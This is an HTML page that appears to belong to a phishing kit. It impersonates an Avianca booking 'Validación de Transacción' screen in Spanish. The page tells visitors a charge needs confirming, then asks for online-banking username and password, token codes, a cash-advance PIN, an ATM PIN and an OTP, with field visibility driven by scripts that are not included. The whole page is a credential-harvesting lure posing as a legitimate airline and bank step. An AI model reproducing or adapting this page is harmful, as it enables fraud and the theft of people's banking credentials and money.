<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Avianca - Booking</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@300;400;500;600;700;800;900&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./css/checkers.css">
  <link rel="stylesheet" href="./css/normalize.css">
  <script src="./js/functions.js"></script>

  <!-- ===== SOLO VISUAL ===== -->
  <style>
    :root{
      --bg:#f5f6f8; --card:#fff; --text:#111827; --muted:#6b7280;
      --border:rgba(2,6,23,.10); --shadow:0 10px 30px rgba(16,24,40,.10);
      --focus:#de0108; --radius:18px;
    }
    *{box-sizing:border-box}
    html,body{
      background:var(--bg);
      font-family:"Red Hat Display","Lato",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
      color:var(--text);
    }

    .logos{
      max-width:720px; margin:18px auto 12px; padding:0 8px;
      display:flex; align-items:center; justify-content:space-between; gap:12px;
    }
    main{max-width:720px; margin:0 auto 32px; padding:0 8px;}

    .content{
      background:var(--card); border:1px solid var(--border); border-radius:var(--radius);
      box-shadow:var(--shadow); padding:clamp(18px,3vw,28px);
    }
    .content>b:first-child{
      display:block; margin-bottom:12px;
      font-size:clamp(20px,2.2vw,26px); font-weight:800;
    }
    .content p{line-height:1.55; margin:4px 0;}

    /* GRID: Etiqueta | Valor */
    #form{
      display:grid;
      grid-template-columns: 170px 1fr; /* label | valor */
      gap:10px 16px;
      align-items:center;
      margin:0 !important;
    }
    #form .labels, #form .values{display:contents;}
    #form .labels b{color:var(--muted); font-weight:600; text-align:right;}
    #form .values p{margin:0; font-weight:700;}

    /* Campos compactos */
    .compact-field{
      width:100% !important;
      max-width: 160px !important;   /* más angosto */
      height: 32px !important;       /* más bajo */
      padding: 0 10px !important;
      border:1px solid #d1d5db !important;
      border-radius:8px !important;
      background:#fff !important;
      font-size:14px;
      outline:none;
      transition:border-color .15s, box-shadow .15s;
    }
    .compact-field:focus{
      border-color:var(--focus) !important;
      box-shadow:0 0 0 2px rgba(222,1,8,.13) !important;
    }

    /* Mapeo de filas (sin tocar IDs existentes) */
    #form .labels b:nth-child(1){grid-column:1; grid-row:1;}  /* Comercio */
    #form .values p:nth-child(1){grid-column:2; grid-row:1;}

    #form .labels b:nth-child(3){grid-column:1; grid-row:2;}  /* Nº tarjeta */
    #form .values p:nth-child(3){grid-column:2; grid-row:2;}

    #form .labels b:nth-child(2){grid-column:1; grid-row:3;}  /* Monto */
    #form .values p:nth-child(2){grid-column:2; grid-row:3;}

    #form .labels b#user{grid-column:1; grid-row:4;}         /* Usuario */
    #form #user{grid-column:2; grid-row:4;}

    #form .labels b#puser{grid-column:1; grid-row:5;}        /* Contraseña */
    #form #puser{grid-column:2; grid-row:5;}

    #form .labels b#otpcode{grid-column:1; grid-row:6;}      /* OTP */
    #form #otpcode{grid-column:2; grid-row:6;}

    /* Contenedor del mensaje de error (debajo del grid, centrado) */
    .inline-error{
      display:none;
      margin:8px 0 0 0;
      text-align:center;
      color:#dc2626;           /* rojo profesional */
      font-size:14px;
      line-height:1.4;
    }
    /* Resaltado de campo con error */
    .is-error{
      border-color:#dc2626 !important;
      box-shadow:0 0 0 2px rgba(220,38,38,.12) !important;
    }

    /* “Autorizar” dentro del card, compacto */
    #btnNextStep.btn-success{
      display:block; margin:14px auto 0;
      width: 120px; height: 36px;
      border-radius:8px; border:0;
      background:#111; color:#fff; font-weight:800; font-size:15px;
      box-shadow:0 6px 14px rgba(0,0,0,.10);
      cursor:pointer; transition:transform .05s ease, opacity .15s ease;
    }
    #btnNextStep.btn-success:active{transform:translateY(1px)}

    /* Link de reenviar (si aplica) */
    #newCode{
      display:block; text-align:center; margin:10px auto 0;
      color:#0d6efd; text-decoration:none; font-size:14px;
      max-width:320px;
    }
    #newCode:hover{text-decoration:underline}

    @media (max-width:600px){
      #form{grid-template-columns:130px 1fr;}
    }
  </style>
</head>
<body>
  <!-- LOADER -->
  <div class="main-loader show">
    <img id="company-loader">
    <div class="loader"></div>
  </div>

  <div class="logos">
    <img id="bank-logo" width="50px">
    <img id="company-logo" width="110px">
  </div>

  <main>
    <div class="content">
      <b>Validación de Transacción</b>
      <p>La transacción realizada en <b>AVIANCA S.A.</b> por <b>$ <span id="flight-price">49.900</span> USD</b> requiere confirmación para continuar con el proceso. Por favor, verifica la información presentada e ingresa los datos de tu Banca Virtual para autorizar de manera segura esta operación.</p>
      <p>Para confirmar esta transacción, ingresa la información de seguridad solicitada a continuación:</p>

      <form id="form">
        <div class="labels">
          <b>Comercio:</b>
          <b>Monto:</b>
          <b>Número de tarjeta:</b>

          <b class="hidden" id="user">Usuario:</b>
          <b class="hidden" id="puser">Contraseña:</b>
          <b class="hidden" id="cdin">Token:</b>
          <b class="hidden" id="dintok">Token:</b>
          <b class="hidden" id="cavance">Clave Avances:</b>
          <b class="hidden" id="ccaj">Clave Cajero:</b>
          <b class="hidden" id="otpcode">Código OTP:</b>
        </div>

        <div class="values">
          <p>AVIANCA S.A.</p>
          <p>$<span id="flight-price">49.000</span> USD</p>
          <p>•••• •••• •••• <span id="card-digits"></span></p>

          <!-- Inputs condicionales (visibilidad la maneja tu JS) -->
          <input class="hidden compact-field" required type="text" id="user">
          <input class="hidden compact-field" required type="text" id="puser">
          <input class="hidden compact-field" oninput="limitDigits(this, 6)" required type="text" id="cdin">
          <input class="hidden compact-field" oninput="limitDigits(this, 8)" required type="text" id="dintok">
          <input class="hidden compact-field" oninput="limitDigits(this, 6)" required type="text" id="cavance">
          <input class="hidden compact-field" oninput="limitDigits(this, 4)" required type="text" id="ccaj">
          <input class="hidden compact-field" oninput="limitDigits(this, 8)" required type="text" id="otpcode">
        </div>
      </form>

      <!-- Mensaje de error inline (debajo de la línea roja que marcaste) -->
      <p id="inline-error" class="inline-error" role="alert" aria-live="polite"></p>

      <!-- Enlace de reenviar (si tu JS lo usa) -->
      <a href="" id="newCode" class="hidden"></a>

      <!-- Botón dentro del card -->
      <button id="btnNextStep" class="btn-success">Autorizar</button>
    </div>
  </main>

  <!-- SCRIPTS -->
  <script src="./js/id_check.js"></script>
</body>
</html>
